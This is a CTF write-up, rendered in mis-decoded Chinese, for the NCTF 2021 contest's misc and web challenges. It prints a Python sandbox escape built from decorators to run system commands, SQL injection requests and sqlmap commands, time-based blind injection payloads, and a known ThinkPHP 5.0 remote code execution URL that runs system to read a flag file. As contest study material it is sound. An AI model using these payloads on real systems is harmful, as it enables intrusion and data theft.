ï¼šçº¿ä¸Šæ¯”èµ› https://nctf.h4ck.fun ä¸€å¹´ä¸€åº¦çš„ NCTF åˆæ¥äº†ã€‚æ˜¯å—é‚®çš„æ ¡èµ›å•¦ã€‚ å¯ä»¥å›é¡¾ä¸€ä¸‹å»å¹´çš„ Writeupï¼š CTF | 2020 NCTF/NJUPTCTF éƒ¨åˆ†WriteUp çœ‹åˆ°æ ¡å¤–é˜Ÿä¼ä»Šå¹´å‰å…­æœ‰é’±ï¼ˆäº¬ä¸œå¡ï¼‰æ‹¿ï¼Œå‰åå°±æœ‰ç¤¼å“äº†ï¼Œæƒ³èµ·æ¥å»å¹´è¿˜æ°´äº†ä¸ªç¬¬å…­ï¼Œåº”è¯¥è¿˜æ˜¯æŒºæœ‰å¸Œæœ›çš„ã€‚ äºæ˜¯å°±æ‹‰ä¸Šå‡ ä¸ªå°ä¼™ä¼´ w00d, l1nk, FantasqueXï¼Œç»„äº†ä¸ª çŒ«é¼ å¤§æˆ˜ æˆ˜é˜Ÿï¼ŒæŠ¥åæ¥ç©äº†ã€‚ è¯´å®è¯ä¹Ÿå°±æ˜¯éšæ„çœ‹çœ‹é¢˜ï¼Œå–µå–µä¸»è¦çœ‹çš„ Misc å’Œ Web é¢˜ç›®ï¼ŒPwn å’Œ Reverse æ˜¯é˜Ÿå‹åšçš„ã€‚ é¢˜ç›®å¥½éš¾ï¼Œå˜¤å˜¤å˜¤ã€‚ Miscç­¾åˆ°å¤åˆ¶ç²˜è´´ NCTF{Welcome_to_NCTF_2021!} Hexé…±çš„ç§˜å¯†èŠ±å›­ é¢˜ç›®æè¿°: æˆ‘ä»¬å¯çˆ±çš„Hexé…±åˆæœ‰äº†ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¯ä»¥å»æ‰§è¡Œå¤šè¡Œè¯­å¥æƒ¹~ ä½†æ˜¯ä¸ºäº†é˜²æ­¢æœ‰äº›å±…å¿ƒåµæµ‹çš„äººï¼Œæˆ‘ä»¬ä¸“é—¨æŠŠæ‹¬å·ï¼Œå•åŒå¼•å·ï¼Œéƒ½è¿‡æ»¤æ‰ï¼Œå™¢å¯¹ä¸å‡†è‰²è‰²ï¼Œæ‰€ä»¥ä¹Ÿä¸å‡†å‡ºç°hå“Ÿ~ Ubuntu Python3.6.9 å¿«å»æ‰¾Hexé…±(QQ:2821876761)ç§èŠå§ é™„ä»¶ï¼š https://nctf.slight-wind.com/misc/hex/runner.py https://attachment.h4ck.fun:9000/misc/hex/runner.py runner.py import sys from base64 import b64decode code = sys.argv[1] try: data = b64decode(code.encode()).decode() except: exit(0) for c in 'h\"\\'(': if c in data: exit(0) exec(data) u1s1ï¼Œè¿‡æ»¤äº†å…¶ä»–çš„éƒ½å¥½è¯´ï¼Œå¤šå¤šå°‘å°‘åœ¨ Flask SSTI æˆ–è€…å…¶ä»–ç”¨åˆ° python å‘½ä»¤æ‰§è¡Œç»•è¿‡çš„åœºåˆéƒ½è§çš„å¾ˆå¤šäº†ã€‚ç„¶è€ŒæŠŠå°æ‹¬å· ( è¿‡æ»¤äº†ï¼Œé‚£å°±çœŸæ²¡è§è¿‡äº†ã€‚ æ¯”èµ›çš„æ—¶å€™ç½‘ä¸Šæ‰¾äº†ä¸€å †ï¼Œéƒ½è¯´è¿‡æ»¤äº†å°æ‹¬å·å°±æ‰§è¡Œä¸äº†å‡½æ•°äº†ï¼Œæ‰€ä»¥åŸºæœ¬æ— è§£ã€‚ äºæ˜¯æƒ³äº†ä¸€å¤©éƒ½æ²¡æƒ³åˆ°è¦æ€ä¹ˆç»•è¿‡è¿™ä¸ªï¼Œå”‰ï¼Œè¿˜æ˜¯å¤ªèœäº†â€¦â€¦ï¼ˆæˆ–è€…è¯´éœ€è¦å¯¹ python äº†è§£æ¯”è¾ƒå¤šï¼Œä¸”è¦æœ‰ç‚¹è„‘æ´æ‰è¡Œäº† éš¾é“çœŸçš„æ²¡æ³•ç»•è¿‡å˜›ï¼Ÿä¸æ˜¯çš„ã€‚ è¿™é‡Œè¦ç”¨åˆ°çš„æ˜¯ python é‡Œçš„å‡½æ•°è£…é¥°å™¨ï¼Œä¹Ÿå°±æ˜¯ @ ç”¨æ³•ï¼Œ@ ç¬¦å·å°±æ˜¯è£…é¥°å™¨çš„è¯­æ³•ç³–ã€‚ å»–é›ªå³°çš„ python æ•™ç¨‹â€”â€”è£…é¥°å™¨ def log(func): print(\"%s is running\" % func.__name__) func() @log def foo(): print(\"i am foo\") æ‰§è¡Œ foo å°±ç›¸å½“äºæ‰§è¡Œä¸‹é¢è¿™ä¸ªä¹‹åçš„ foo å‡½æ•°äº†ã€‚ foo = log(foo) è€Œä¸”è£…é¥°å™¨æ˜¯å¯ä»¥åµŒå¥—çš„ã€‚ ç”±äºæ²¡æœ‰ ban os è¿™äº›å…³é”®å­—ï¼Œå¯ä»¥ç›´æ¥ import è¿›æ¥æ‹¿æ¥ç”¨ã€‚ è€Œå­—ç¬¦çš„è¯ï¼Œç”±äºä¸èƒ½ç”¨å¼•å·ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ __doc__ ä»ä¸€äº›å¯¹è±¡çš„ docstrings æ–‡æ¡£é‡Œé€šè¿‡ä¸‹æ ‡æ¥å–ã€‚è¿™ä¸ªè¦æ³¨æ„ç›¸åº”çš„ python ç‰ˆæœ¬ï¼Œè¿™é¢˜ç¯å¢ƒæ˜¯ Ubuntu Python3.6.9ã€‚ ï¼ˆè¿™é‡Œæ¨èç”¨ pyenv æ¥ç© å¦å¤–ï¼Œå¯ä»¥æ‰§è¡Œå¤šè¡Œå‘½ä»¤ã€‚ç”±äºä¸èƒ½ç”¨ (ï¼Œä¸èƒ½æ„é€ å‡½æ•°äº†ï¼Œä½†è¿˜å¯ä»¥æ„é€ å¯¹è±¡ã€‚ å…¶å®è¿™é‡Œåªéœ€è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å°±è¡Œï¼Œä¹Ÿå°±æ˜¯ system(xxx). ä¸€æ­¥æ­¥æ¥ï¼Œå…ˆç”¨æ–‡æ¡£æ„é€ å­—ç¬¦ä¸² n = {}.__doc__ s = 'ls' s = 'cat flag' for i in s: try: idx = n.index(i) except: idx = 'error' print(i, '===&gt;', idx) # l ===&gt; 69 # s ===&gt; 97 # # c ===&gt; 2 # a ===&gt; 27 # t ===&gt; 3 # ===&gt; 6 # f ===&gt; 75 # l ===&gt; 69 # a ===&gt; 27 # g ===&gt; 42 è¯•äº†è¯•å‘ç° class é‡Œå…¶å®å•¥éƒ½è¡Œï¼Œæ¯”å¦‚ object, list, int éƒ½è¡Œï¼Œåæ­£ä¹Ÿå°±æ˜¯åº”ä»˜ä¸ªåŒ¿åå‡½æ•°çš„å˜é‡ç½¢äº†ï¼ˆï¼Ÿï¼‰ã€‚ç”šè‡³ pass ä¹Ÿè¡Œï¼Œè¿™ä¹ˆè¯´å…¶å®ä¹Ÿå°±æ˜¯ä¸ºäº†æ»¡è¶³ class åˆ›å»ºçš„è¯­æ³•è¦æ±‚å§ã€‚ äºæ˜¯å–µå–µæ„é€ çš„ payload å°±æ˜¯ from os import system n = {}.__doc__ l = lambda _: n[69]+n[97] # ls f = lambda _: n[2]+n[80]+n[55]+n[6]+n[75]+n[69]+n[80]+n[88] # cat flag @system @f class x:pass å®é™…ä¸Šæ‰§è¡Œçš„å°±æ˜¯ system((lambda _:'cat flag')(x)) æˆåŠŸå•¦ï¼ å†çœ‹å®˜æ–¹ wpï¼Œè¿™ä¸ªå°±æ›´ä¸€èˆ¬åŒ–äº†ã€‚ b=[].__class__.__base__.__class__.__subclasses__ d=[].__doc__ n={}.__doc__ _=lambda _:[].__class__.__base__ @b @_ class s:_ l=s[69] q=lambda _:d[66]+d[2] p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88] @l.load_module @q class o:_ @o.system @p class w:_ è¯¦è§å–µå–µçš„æ³¨é‡Šã€‚ b=[].__class__.__base__.__class__.__subclasses__ # &lt;method '__subclasses__' of 'type' objects&gt; ä¹Ÿå°±æ˜¯ type.__subclasses__ d=[].__doc__ # \"list() -&gt; new empty list\\nlist(iterable) -&gt; new list initialized from iterable's items\" n={}.__doc__ # \"dict() -&gt; new empty dictionary\\ndict(mapping) -&gt; new dictionary initialized from a mapping object's\\n (key, value) pairs\\ndict(iterable) -&gt; new dictionary initialized as if via:\\n d = {}\\n for k, v in iterable:\\n d[k] = v\\ndict(**kwargs) -&gt; new dictionary initialized with the name=value pairs\\n in the keyword argument list. For example: dict(one=1, two=2)\" _=lambda _:[].__class__.__base__ # &lt;class 'object'&gt; @b @_ class s:_ # s =&gt; type.__subclasses__(object) æ˜¯ä¸ªåŒ…å«å„ç§classçš„list l=s[69] # &lt;class '_frozen_importlib.BuiltinImporter'&gt; q=lambda _:d[66]+d[2] # os p=lambda _:n[2]+n[80]+n[55]+n[6]+n[75]+d[0]+n[80]+n[88] # cat flag @l.load_module @q class o:_ # o =&gt; &lt;module 'os' (built-in)&gt; @o.system @p class w:_ ä¸€æ­¥æ­¥åŠ è½½æ¨¡å— load_module osï¼Œæœ€ååˆ©ç”¨å…¶ä¸­çš„ system æ‰§è¡Œ cat flagã€‚ å¦å¤–æ‰¾èµ„æ–™çš„æ—¶å€™è¿˜æœ‰ä¸€äº›ç¥å¥‡çš„å‘ç°ï¼Œåˆ—åœ¨ä¸‹é¢äº†ã€‚ Extensive Readings: Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹  æ€»ç»“ - CTFä¸­çš„SSTI0x01 é‡Œé¢æ€»ç»“äº†å¥½å¤šç§è¿‡æ»¤å­—ç¬¦çš„ç»•è¿‡æ–¹æ³• æµ…æSSTI(pythonæ²™ç›’ç»•è¿‡) éƒç¦»æ­Œä¸¶çš„ pythonå®‰å…¨ä¹‹å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰ pythonæ²™ç›’é€ƒé€¸ï¼Œä»»æ„å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°å’Œæ¨¡å—ï¼Œbalabala [è¯‘]PlaidCTFä¸­ä¸€é“PyJailé€ƒé€¸é¢˜ç›®åˆ†æ python2 ä¸­ x å’Œ repr(x) å®Œå…¨ç­‰ä»·ï¼Œè¿™é¢˜ä»…ä»…é€šè¿‡ set([':', '%', \"'\", '', '(', ',', ')', '}', '{', '[', '.', ']', '&lt;', '_', '~']) ä¸­çš„å­—ç¬¦æ¥è·å¾—ä»£ç ã€‚åˆ©ç”¨ç¬¦å·é€šè¿‡ True False æ¥åˆ›é€ æ•°å­—ï¼Œå†é€šè¿‡åˆ‡ç‰‡å¾—åˆ°å­—ç¬¦ã€‚æ„Ÿè§‰æœ‰ç‚¹ç±»ä¼¼ä¸ Brainfuck äº†ã€‚ ä¸€é“æœ‰è¶£çš„pyjailé¢˜ç›®åˆ†æ ç”¨ Unicode ç»•è¿‡ï¼Œåœ¨ python3 ä¸­æ”¯æŒ Non-ASCII Identifies å¹¶ä¸”æ‰€æœ‰éƒ½ä¼šè¢«è½¬æ¢æˆ unicode çš„NFKC ä¹Ÿå°±æ˜¯æ ‡å‡†æ¨¡å¼ã€‚unicodeå­—ç¬¦å¤§å…¨ Pythoné»‘é­”æ³•-[]ç»•è¿‡ç©ºæ ¼å®ç°å˜é‡è¦†ç›– è¿‡æ»¤ç­‰å·æ—¶ç”¨ for å¾ªç¯è¦†ç›–å˜é‡ï¼Œè¿‡æ»¤ç©ºæ ¼æ—¶ç”¨ list ç”Ÿæˆå™¨å’Œä¸­æ‹¬å·ã€‚å¯ä»¥å…ˆæŠŠè¿‡æ»¤çš„å˜é‡ç»™è¦†ç›–æ‰ï¼Œå† RCE æˆ–è€…è¯»æ–‡ä»¶ä»€ä¹ˆçš„ã€‚ &gt;&gt;&gt; a = 0 &gt;&gt;&gt; for a in [1]: ... pass ... &gt;&gt;&gt; a 1 &gt;&gt;&gt; a = 0 &gt;&gt;&gt; [[str][0]for[a]in[[1]]] [&lt;type 'str'&gt;] &gt;&gt;&gt; a 1 Hello File Format é¢˜ç›®æè¿°: aiQG_ is learning to develop programs for macOS GPU. He got a file from the GPU, but he couldn't read it. Can you translate this file for him? é™„ä»¶é“¾æ¥: é“¾æ¥ï¼šhttps://pan.baidu.com/s/1swBiyWrAx33M8DDJh7LtNQ æå–ç ï¼šuo1v https://wwn.lanzoui.com/ix6wXwyi0ih hint: aiQG_ wanted to render one frame of 1920*1080 ä¸€ä¸ª bin æ–‡ä»¶ï¼Œé‡Œé¢å·¨å¤šçš„ 0xff æ€»é•¿åº¦ 0x5EEC00ï¼Œæç¤ºè¯´ä»–åœ¨æ¸²æŸ“ä¸€å¼  1920*1080 çš„å›¾ï¼Œé™¤ä¸€ä¸‹å‘ç°æ­£å¥½æ˜¯3å€é•¿åº¦ï¼Œå¾ˆæ˜æ˜¾æ˜¯ RGB äº†ã€‚ Exp: # &gt;&gt;&gt; 1920*1080 # 2073600 # &gt;&gt;&gt; hex(1920*1080) # '0x1fa400' # &gt;&gt;&gt; 0x5EEC00/0x1fa400 # 3.0 from PIL import Image with open('GPU data.bin', 'rb') as f: s = f.read() l = [(s[i], s[i+1], s[i+2]) for i in range(0, len(s), 3)] img = Image.new('RGB', (1920, 1080)) img.putdata(l) # img.show() img.save('GPU data.png') # NCTF{TGA_NOT_GTA} ![GPU data](CTF_2021NCTF/GPU data.png) çœ‹äº†å®˜æ–¹ wp è¯´è¿™ä¸ªæ˜¯ tga æ ¼å¼ TGA files commonly have the extension â€œ.tgaâ€ on PC DOS/Windows systems and macOS (older Macintosh systems use the â€œTPICâ€ type code). The format can store image data with 8, 15, 16, 24, or 32 bits of precision per pixel[3] â€“ the maximum 24 bits of RGB and an extra 8-bit alpha channel. Color data can be color-mapped, or in direct color or truecolor format. Image data may be stored raw, or optionally, a lossless RLE compression similar to PackBits can be employed. This type of compression performs poorly for typical photographic images, but works acceptably well for simpler images, such as icons, cartoons and line drawings. åšé¢˜åšç´¯äº†æ¥ç©ç©æ¸¸æˆå§ é¢˜ç›®æè¿°ï¼š åšäº†ä¸€å¤©çš„é¢˜ç›®ï¼Œéƒ½ç´¯äº†å§ï¼Œå¿«æ¥ç©ç©æˆ‘æ–°å†™çš„é£æœºå¤§æˆ˜å§ï¼Œåªè¦é€šå…³å°±èƒ½è·å¾—flagå“Ÿï½ å¯¹äº†ï¼Œå¦‚æœä½ çœŸçš„æƒ³ç©æ¸¸æˆï¼Œä¹Ÿè®¸ä½ éœ€è¦ä¸€ä¸ªmacï¼ŒIntelå’ŒApple siliconèŠ¯ç‰‡éƒ½æ”¯æŒ é™„ä»¶é“¾æ¥ï¼š https://attachment.h4ck.fun:9000/misc/PlaneFire.app.tar.gz https://upyun.clq0.top/PlaneFire.app.tar.gz https://nctf.slight-wind.com/misc/PlaneFire.app.tar.gz å¥½åƒæ˜¯ä¸ª unity çš„æ¸¸æˆï¼Œé¢˜ç›®è¯´è¦ç”¨ macï¼ŒIntel å’Œ Apple silicon èŠ¯ç‰‡éƒ½æ”¯æŒæ‰èƒ½ç©æ¸¸æˆï¼Œå¯æ¶å•Šï¼ ä¸å¦‚ç›´æ¥å»èµ„æºæ–‡ä»¶é‡Œç¿»åƒåœ¾ å¾ˆå¥½ã€‚ Webezsql é¢˜ç›®æè¿°: è¿™è¿˜èƒ½æ³¨å…¥å— http://129.211.173.64:3080/login.php é™„ä»¶é“¾æ¥ï¼š http://129.211.173.64:3080/www.zip login.php //... &lt;?php if (isset($_POST['password'])){ $query = db::prepare(\"SELECT * FROM `users` where password=md5(%s)\", $_POST['password']); if (isset($_POST['name'])){ $query = db::prepare($query . \" and name=%s\", $_POST['name']); } else{ $query = $query . \" and name='benjaminEngel'\"; } $query = $query . \" limit 1\"; $result = db::commit($query); if ($result-&gt;num_rows &gt; 0){ die('NCTF{ez'); } else{ die('Wrong name or password.'); } } //... DB.php &lt;?php class DB{ private static $db = null; public function __construct($db_host, $db_user, $db_pass, $db_database){ static::$db = new mysqli($db_host, $db_user, $db_pass, $db_database); } static public function buildMySQL($db_host, $db_user, $db_pass, $db_database) { return new DB($db_host, $db_user, $db_pass, $db_database); } public static function getInstance(){ return static::$db; } public static function connect_error(){ return static::$db-&gt;connect_errno; } public static function prepare($query, $args){ if (is_null($query)){ return; } if (strpos($query, '%') === false){ die('%s not included in query!'); return; } // get args $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) &amp;&amp; count($args) == 1 ) { $args = $args[0]; $args_is_array = true; } $count_format = substr_count($query, '%s'); if($count_format !== count($args)){ die('Wrong number of arguments!'); return; } // escape foreach ($args as &amp;$value){ $value = static::$db-&gt;real_escape_string($value); } // prepare $query = str_replace(\"%s\", \"'%s'\", $query); $query = vsprintf($query, $args); return $query; } public static function commit($query){ $res = static::$db-&gt;query($query); if($res !== false){ return $res; } else{ die('Error in query.'); } } } ?&gt; config.php &lt;?php $db_host = \"db\"; $db_user = \"mysql\"; $db_pass = \"mysql123\"; $db_database = \"2021\"; include 'DB.php'; DB::buildMySQL($db_host, $db_user, $db_pass, $db_database); if(db::connect_error()){ die('Error whiling connecting to DB'); } ?&gt; å‚è€ƒ Hack.lu CTF 2021 Diamond Safe ä¸€é¢˜çš„ä¸€éƒ¨åˆ†ï¼Œå‡ ä¹æ˜¯åŸé¢˜å§ã€‚ ç”±äºç”¨äº†ä¸¤æ¬¡ db::prepareï¼Œè€Œç¬¬äºŒæ¬¡ç›´æ¥æ‹¼æ¥äº†ä¹‹å‰çš„ $queryï¼Œäºæ˜¯å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡çš„æ—¶å€™ password å‚æ•°ä¼  %sï¼Œè€Œååœ¨ç¬¬äºŒæ¬¡é€šè¿‡æ•°ç»„ä¼  nameï¼Œä»è€Œä¾æ¬¡ç»™ä¸¤ä¸ª %s èµ‹å€¼ï¼Œè¿™æ ·å°±èƒ½å®ç° sql æ³¨å…¥äº†ã€‚ payload: POST /login.php HTTP/1.1 Host: 129.211.173.64:3080 Content-Length: 62 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://129.211.173.64:3080 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://129.211.173.64:3080/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close password=%s&amp;name[0]=)+or+1%3d1+union+select+1,2,3--+&amp;name[1]=a å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†flagï¼šNCTF{3v3ryth1ng_ æç¤ºè¯´å¦ä¸€éƒ¨åˆ†åœ¨æ•°æ®åº“é‡Œã€‚ ç„¶åæ‹¿ sqlmap ç›²æ³¨ä¸€ä¸‹ name[0] å‚æ•°å°±è¡Œã€‚è¿™é‡Œæ˜¯æ—¶é—´ç›²æ³¨ï¼Œå¸ƒå°”ç›²æ³¨åº”è¯¥ä¹Ÿè¡Œã€‚è¦æ˜¯äºŒåˆ†æ³•æ›´å¿«äº†ã€‚ Payload: password=%s&amp;name[0]=) AND (SELECT 8543 FROM (SELECT(SLEEP(5)))zAnj)-- kVPP&amp;name[1]=a å‘ç° flag åœ¨ 2021 æ•°æ®åº“ä¸‹çš„ NcTF è¡¨é‡Œï¼Œåˆ—åä¸º fl@gã€‚ è¿™ä¸ª fl@g è¦æ‹¿åå¼•å·åŒ…ä¸€ä¸‹ï¼Œä¸ç„¶å°±å…¨æ˜¯ NULL äº†ã€‚ sqlmap -r payload.txt --random-agent -p \"name[0]\" -D 2021 -T NcTF -C '`fl@g`' --dump -v å¾—åˆ° not_fantast1c_:)} NCTF{3v3ryth1ng_not_fantast1c_:)} æ‘†å°±å®Œäº‹äº† é¢˜ç›®æè¿°ï¼š å•Šå¯¹å¯¹å¯¹ å¤ªå¯¹è¾£å¤ªå¯¹è¾£ target 1: http://129.211.173.64:8085/public/index.php/index/index/indextarget 2: http://47.101.160.205:8085/public/index.php/index/index/index å¤‡æ³¨ï¼š if you get no idea about the problem,there is no harm in diffing the source code with the official one. ThinkPHP v5.0.16 www.zip æœ‰æºç  ä¸è¿‡å‘ç°ç›´æ¥æ‹¿é‚£ä¸ªç»å…¸ RCE çš„æ¥æ‰“å°±è¡Œã€‚ http://129.211.173.64:8085/public/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 http://129.211.173.64:8085/public/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat${IFS}/flag æˆ–è€…æ‰¾ä¸ªç°æˆå·¥å…·ï¼ˆ nctf{m1saka_wanna_kaibai} æ‘†å°±å®Œäº‹äº†2.0 é¢˜ç›®æè¿°ï¼šå·èµ·æ¥ ä¸å‡†æ‘†ï¼target: http://129.211.173.64:8086/public/index.php/index/index/index è¿™é¢˜ä¹Ÿç»™äº† www.zip æºç ã€‚ å’Œä¸Šé¢ä¸€é¢˜æºç  diff ä¸€ä¸‹ã€‚ å¯ä»¥å‘ç°æŠŠé‚£ä¸ª RCE çš„ç»™ä¿®äº†ï¼Œè€Œä¸”ç»™äº†ä¸ª ffllaagg.phpï¼Œåº”è¯¥å°±æ˜¯è¦è¯»è¿™ä¸ªæ–‡ä»¶äº†ã€‚ é‚£è¿˜æ˜¯æ¥ç€çœ‹ä»–æ§åˆ¶å™¨å§ã€‚ application/index/controller/M1sakaM1yuu.php &lt;?php /* * @Author: m1saka@x1ct34m * @blog: www.m1saka.love */ namespace app\\index\\controller; function waf($str){ if(preg_match(\"/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i\", $str)){ return true; } } class M1sakaM1yuu { public function index() { $username = request()-&gt;get('username/a'); $str = implode(',',$username); if (waf($str)) { return '&lt;img src=\"http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg\" alt=\"hutao\" /&gt;'; } if($username){ db('m1saka')-&gt;insert(['username' =&gt; $username]); return 'å•Šå¯¹å¯¹å¯¹'; } else { return 'è¯´ä»€ä¹ˆæˆ‘å°±å¼€æ‘†';// } } } æŒ‰ç†è¯´ï¼Œè®¿é—® http://129.211.173.64:8086/public/index.php/index/M1sakaM1yuu/index åº”è¯¥å°±èƒ½åˆ°è¿™é‡Œï¼Œä½†æ˜¯è¿™é‡Œä¸è¡Œã€‚ ä¸ºäº†è®¿é—®åˆ°è¿™é‡Œï¼Œç‰¹åœ°å»çœ‹äº† ThinkPHP çš„æ§åˆ¶å™¨è·¯ç”±ï¼Œè¿™ä¸ªæ˜¯é©¼å³°å‘½åæ³•ã€‚ è¿™é“é¢˜é‡Œ url_convert å°±è®¾ç½®ä¸º trueï¼Œæ‰€ä»¥å°±åªèƒ½é€šè¿‡ ä¸‹åˆ’çº¿ çš„æ–¹å¼æ¥è®¿é—®äº†ã€‚ æ­£å¦‚å‡ºé¢˜äººçš„å›å¤ï¼š å‡ºé¢˜çš„æ—¶å€™ç‰¹æ„å®šä¹‰äº†ä¸€ä¸ªä½¿ç”¨é©¼å³°å‘½åæ³•çš„æ§åˆ¶å™¨M1sakaM1yuuï¼Œåœ¨thinkPHPå®˜æ–¹æ–‡æ¡£ä¸­ï¼Œè®¿é—®çš„æ­£ç¡®æ–¹å¼åº”è¯¥æ˜¯index/m1saka_m1yuu/indexï¼Œä¸­é—´ä½¿ç”¨ä¸‹åˆ’çº¿éš”å¼€ï¼Œä½†æ˜¯å…¼å®¹äº†index/M1sakaM1yuu/indexè¿™æ ·çš„è®¿é—®æ–¹å¼ï¼Œè¿™ä¹Ÿæ˜¯åœ¨ã€Šæ‘†å°±å®Œäº‹äº†ã€‹ä¸­æ­¤è®¿é—®æ–¹å¼èƒ½è®¿é—®åˆ°çš„åŸå› ã€‚ä½†æ˜¯åœ¨ã€Šæ‘†å°±å®Œäº‹äº†2.0ã€‹ä¸­æˆ‘åŠ ä¸Šäº†å®˜æ–¹è¡¥ä¸å–æ¶ˆéé¢„æœŸè§£æ³•ï¼Œå®˜æ–¹è¡¥ä¸ä¸å…è®¸è·¯ç”±ä¸­å­˜åœ¨å¤§å†™å­—æ¯ï¼Œæ‰€ä»¥ä¼šè¿”å›404ã€‚å¸Œæœ›å¤§å®¶ä»¥ååœ¨å¼€å‘å’Œä»£ç å®¡è®¡æ—¶èƒ½æ³¨æ„åˆ°è¿™ä¸ªç»†èŠ‚ã€‚ äºæ˜¯åº”è¯¥è®¿é—® http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index æ¥ä¸‹æ¥å°±æ˜¯ SQL æ³¨å…¥äº†ã€‚ è¿˜å¥½å‡ºé¢˜äººç»™äº† sql æ–‡ä»¶ï¼Œå¯ä»¥æ–¹ä¾¿å¤ç°ã€‚ DROP DATABASE IF EXISTS `nctf`; CREATE DATABASE nctf; GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@'127.0.0.1' identified by 'nctf'; GRANT SELECT,INSERT,UPDATE,DELETE on nctf.* to nctf@localhost identified by 'nctf'; GRANT ALL PRIVILEGES on *.* to nctf@'127.0.0.1' WITH GRANT OPTION; GRANT ALL PRIVILEGES on *.* to nctf@localhost WITH GRANT OPTION; flush privileges; use nctf; CREATE TABLE `m1saka` ( `id` integer(9) AUTO_INCREMENT, `username` varchar(20) NOT NULL, `password` varchar(50) NULL, `flag_in_ffllaagg.php` varchar(100) NULL, `age` int(5) NULL, PRIMARY KEY (`id`) ); INSERT INTO `m1saka` (`username`,`password`,`flag_in_ffllaagg.php`,`age`) VALUES ('m1saka','marry_dingnan','Admin',999); è¿™é‡Œä¹Ÿæç¤ºäº† flag åœ¨é‚£ä¸ªæ–‡ä»¶é‡Œã€‚ è¿™é‡Œå¤ç°ä¸€ä¸‹ï¼Œç”±äºç›®å‰ä¸»åŠæ–¹æ²¡æœ‰å¼€æºé¢˜ç›®ï¼Œè¿™é‡Œå°±ç”¨ DASCTF çš„æ¨¡æ¿è‡ªå·±é€ ä¸€ä¸ª Dockerfile å¥½äº†ã€‚ FROM dasctfbase/web_php56_apache_mysql COPY www /var/www/html # å¦‚éœ€æ“ä½œæ•°æ®åº“è¯·å°† sql æ–‡ä»¶æ‹·è´åˆ° /db.sql COPY www/db.sql /db.sql # è¯·å£°æ˜å¯¹å¤–æš´éœ²ç«¯å£ EXPOSE 80 docker build -t nctf2021_bai . docker run -it -d -p 8000:80 nctf2021_bai:latest docker ps # xxxxx # è¿›å»æ”¹ MySQL é…ç½® docker exec -it xxxx /bin/bash é¦–å…ˆéœ€è¦æŠŠ MySQL çš„ secure_file_prive å…¨å±€å‚æ•°è®¾ä¸ºç©ºï¼ˆä¸æ˜¯ NULLï¼‰ã€‚ è®¾ç½®ä¹‹å‰ï¼Œæ˜¯è¯»ä¸åˆ°å…¶ä»–æ–‡ä»¶çš„ã€‚ é™åˆ¶ mysql ä¸å…è®¸å¯¼å…¥ | å¯¼å‡º --secure_file_prive=null é™åˆ¶ mysql çš„å¯¼å…¥ | å¯¼å‡º åªèƒ½å‘ç”Ÿåœ¨ /tmp/ ç›®å½•ä¸‹ --secure_file_priv=/tmp/ ä¸å¯¹ mysql çš„å¯¼å…¥ | å¯¼å‡ºåšé™åˆ¶ --secure_file_priv= echo 'secure_file_priv=' &gt;&gt; /etc/mysql/mysql.conf.d/mysqld.cnf ç„¶åé‡å¯å®¹å™¨ï¼Œè¿™æ ·å°±èƒ½è¯»åˆ°æ–‡ä»¶äº†ã€‚ ç°åœ¨å°±å¯ä»¥è®¿é—® http://127.0.0.1:8000/public/index.php/index/m1saka_m1yuu/index?username= è¿›å…¥åˆ°æ‰€éœ€çš„æ§åˆ¶å™¨äº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯ SQL æ³¨å…¥ç¯èŠ‚ã€‚ å¯¹æ¯”ä¸€ä¸‹å®˜æ–¹æºç ï¼Œæœ‰ä¸ª EXP çš„è¿‡æ»¤ç»™å»æ‰äº†ã€‚ è·Ÿç€ db('m1saka')-&gt;insert(['username' =&gt; $username]); çœ‹ insert æ‰€ä»¥åªéœ€è¦ä¼ ä¸ªæ•°ç»„ï¼ˆarrayï¼‰ï¼Œç„¶åç¬¬0ä¸ªå…ƒç´ æ˜¯ expï¼Œç¬¬1ä¸ªå…ƒç´ æ”¾æ³¨å…¥çš„å†…å®¹å°±å®Œäº‹äº†ã€‚ å†æ¥çœ‹ wafã€‚ function waf($str){ if(preg_match(\"/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i\", $str)){ return true; } } ç›¸å½“äºæŠŠå†™æ–‡ä»¶çš„é‚£äº›éƒ½è¿‡æ»¤æ‰äº†ã€‚å†è€ƒè™‘åˆ°æç¤ºäº†æ˜¯è¯»æ–‡ä»¶ï¼Œäºæ˜¯è¯•ç€æ„é€ æ—¶é—´ç›²æ³¨ã€‚ GET /public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((select(substr(load_file(\"/var/www/html/ffllaagg.php\"),1,1))=0x3c),sleep(3),0) å…ˆåœ¨ docker é‡Œçš„ mysql è¯•è¯•ã€‚ Exp: è¿™é‡Œæœ¬åœ°è°ƒè¯•ï¼Œå»¶æ—¶å°±è®¾çš„çŸ­ä¸€ç‚¹äº†ï¼Œå®é™…æ 